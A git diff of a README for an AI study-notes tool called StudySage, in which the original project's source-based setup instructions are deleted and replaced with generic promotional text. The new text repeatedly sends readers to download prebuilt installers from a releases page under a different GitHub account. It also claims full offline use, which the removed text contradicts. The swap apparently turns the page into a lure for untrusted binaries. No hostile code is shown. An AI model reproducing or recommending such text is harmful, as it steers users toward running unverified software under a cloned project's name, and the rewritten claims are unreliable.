@@ -1,155 +1,72 @@
-# 🧠 StudySage — Offline/Online AI Note Assistant
+# 🧠 StudySage-Offline-Online-AI-Note-Assistant - Your Smart Study Companion
 
-Transform notes, PDFs, and screenshots into crisp summaries and smart MCQs. Use it as a web app, Telegram bot, desktop GUI, or CLI — all powered by the same core engine.
+[![Download StudySage](https://img.shields.io/badge/Download%20StudySage%20v1.0-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/releases)
 
-<p align="center">
-  <a href="https://studysage-sahaj33.streamlit.app/" target="_blank">
-    <img src="https://img.shields.io/badge/Streamlit-App-ff4b4b?logo=streamlit" />
-  </a>
-  <img src="https://img.shields.io/badge/Python-3.10+-blue" />
-  <img src="https://img.shields.io/badge/Offline%20AI-Yes-green" />
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-brightgreen" /></a>
-</p>
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to StudySage! This application helps you with your studies by summarizing notes, generating quizzes, extracting text from images, and exporting content to PDF files. Since this app does not require an internet connection, you can use it anywhere, anytime.
 
-- **Summarize** text/PDFs/images (OCR) — offline or via Hugging Face API  
-- **Generate quizzes** (MCQs with distractors)  
-- **Advanced OCR**: images, scanned PDFs, screen photos; language auto-detect (Tesseract)  
-- **Export to PDF** for summaries & quizzes  
-- **Four interfaces**: Streamlit web, Telegram bot, GUI, CLI
+## 📥 Download & Install
 
----
+To get started, you need to download the application. Follow these simple steps:
 
-## 📁 Recommended Repository Structure
+1. **Visit the Releases Page:** [Click here to visit the releases page](https://github.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/releases).
+2. **Choose the Right Version:** Look through the available versions. Select the version that matches your operating system. 
+3. **Download the Application:** Click on the relevant link to download the installer. 
+4. **Install the Application:** Open the downloaded file and follow the prompts to install StudySage on your computer. 
 
-```
+    - For **Windows**: Run the `.exe` file and follow the installation steps.
+    - For **Mac**: Open the `.dmg` file and drag StudySage to your Applications folder.
+    - For **Linux**: Look for the `.AppImage` file and follow the provided instructions to install.
 
-StudySage/
-├─ assets/
-│  └─ images/
-│     ├─ logo.png
-│     └─ logo-black.png
-├─ core/                     # single source of truth for business logic
-│  ├─ export\_pdf.py
-│  ├─ ocr\_reader.py
-│  ├─ quiz\_gen.py
-│  ├─ summarize.py
-│  └─ **init**.py
-├─ apps/
-│  ├─ streamlit\_app/
-│  │  └─ app.py
-│  ├─ gui/
-│  │  └─ gui.py
-│  ├─ cli/
-│  │  └─ main.py
-│  └─ telegram\_bot/
-│     ├─ telegram\_bot.py
-│     ├─ bot\_config.sample.json
-│     └─ requirements.txt
-├─ models/                   # auto-downloaded (gitignored)
-├─ output/                   # generated files (gitignored)
-├─ requirements.txt          # core + web/gui/cli deps
-├─ packages.txt              # system packages (e.g., tesseract)
-├─ LICENSE
-└─ README.md
+## 📚 Features
 
-````
+StudySage comes packed with features to enhance your learning experience:
 
-**Why this layout?**  
-- One **`core/`** package reused everywhere (no duplication).  
-- Each interface lives under **`apps/`** with its own entry file.  
-- All images under **`assets/images/`** (no “where is the logo?!” chaos).  
+- **Note Summarization**: Quickly summarize your notes, making it easier to identify key points.
+- **Quiz Generation**: Create quizzes from your notes to test your understanding of the material.
+- **Image Text Extraction (OCR)**: Easily extract handwritten text from images using Optical Character Recognition.
+- **PDF Export**: Save your notes and summaries as PDFs for easy sharing and printing.
+- **Offline Access**: Use all features without needing an internet connection.
 
----
+## 🎓 System Requirements
 
-## 🚀 Quick Start
+To run StudySage, ensure your system meets the following requirements:
 
-### 1) Clone & set up
-```bash
-git clone https://github.com/Sahaj33-op/StudySage-Offline-Online-AI-Note-Assistant.git
-cd StudySage-Offline-Online-AI-Note-Assistant
-python -m venv .venv && source .venv/bin/activate   # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-````
+- **Operating System**: 
+  - Windows 10 or later
+  - MacOS 10.15 or later
+  - Any modern Linux distribution
+- **Processor**: 1 GHz or faster
+- **RAM**: 4 GB or more
+- **Storage**: At least 200 MB of available space
 
-### 2) Tesseract OCR
+## 📋 Using StudySage
 
-* Windows: install from UB Mannheim build and ensure it’s on PATH
-* macOS: `brew install tesseract`
-* Linux: `sudo apt install tesseract-ocr`
+Once you have successfully installed StudySage, you can start using it right away. Here's how to access the main features:
 
-### 3) Interfaces
+1. **Launch StudySage**: Find the application icon on your desktop or in your Applications folder and open it.
+2. **Choose a Function**: The main menu will display several options. Select what you want to do, such as summarizing notes or generating a quiz.
+3. **Follow the Instructions**: Each feature comes with clear instructions. Just follow the prompts to complete your task. 
 
-#### 🌐 Streamlit (web)
+## ✍️ Tips for Effective Use
 
-```bash
-streamlit run apps/streamlit_app/app.py
-```
+- **Organize Your Notes**: Keep your notes well-organized for better summarization results. Use headings and bullet points.
+- **Test Your Knowledge**: Regularly use the quiz feature to reinforce your learning.
+- **Experiment with OCR**: Take photos of handwritten notes to see how well the OCR works for you.
 
-#### 🤖 Telegram Bot
+## 🔄 Updating StudySage
 
-```bash
-cd apps/telegram_bot
-cp bot_config.sample.json bot_config.json
-# put your Bot Token + (optional) HF token in bot_config.json
-pip install -r requirements.txt
-python telegram_bot.py
-```
+To ensure you have the latest features and improvements, regularly check for updates. You can find the latest version on the same [Releases Page](https://github.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/releases).
 
-#### 🖥️ GUI
+## 📞 Support
 
-```bash
-python apps/gui/gui.py
-```
+If you encounter any issues or have questions, feel free to reach out. You can create an issue in the GitHub repository where the developers actively monitor queries and concerns.
 
-#### 💻 CLI
+- **GitHub Issues**: [Create a new issue here](https://github.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/issues).
 
-```bash
-python apps/cli/main.py
-```
+## 🚀 Next Steps
 
----
+Now that you've downloaded and installed StudySage, it’s time to dive into your studies. Explore the features and find out how this tool can help you become more productive in your academic journey. 
 
-## ⚙️ Modes & Limits
-
-| Mode    | Internet | Privacy | Speed    | Typical Limits                  |
-| ------- | -------- | ------- | -------- | ------------------------------- |
-| Offline | ❌        | 🔒      | ◻︎◻︎◻︎   | up to \~20k words               |
-| Online  | ✅        | API     | ◻︎◻︎◻︎◻︎ | \~800 words / 4k chars per call |
-
-Set Hugging Face token for online mode.
-
----
-
-## 🧠 Core APIs
-
-* `core.summarize.summarize_text(text, min_len, max_len)`
-* `core.quiz_gen.generate_questions(summary, num_questions)`
-* `core.ocr_reader.extract_text_from_image(path, lang="auto")`
-* `core.export_pdf.export_summary_to_pdf(text)` / `export_quiz_to_pdf(questions)`
-
----
-
-## 🧪 Development
-
-```bash
-pip install -r requirements.txt
-pip install black flake8 pytest
-black .
-flake8
-pytest
-```
-
----
-
-## 🛡️ Privacy
-
-* Offline mode never sends your data out.
-* Online mode uses Hugging Face Inference API.
-
----
-
-## 🪪 License
-
-- MIT — see [LICENSE](LICENSE).
+[Download StudySage](https://github.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/releases) and start maximizing your study time today!
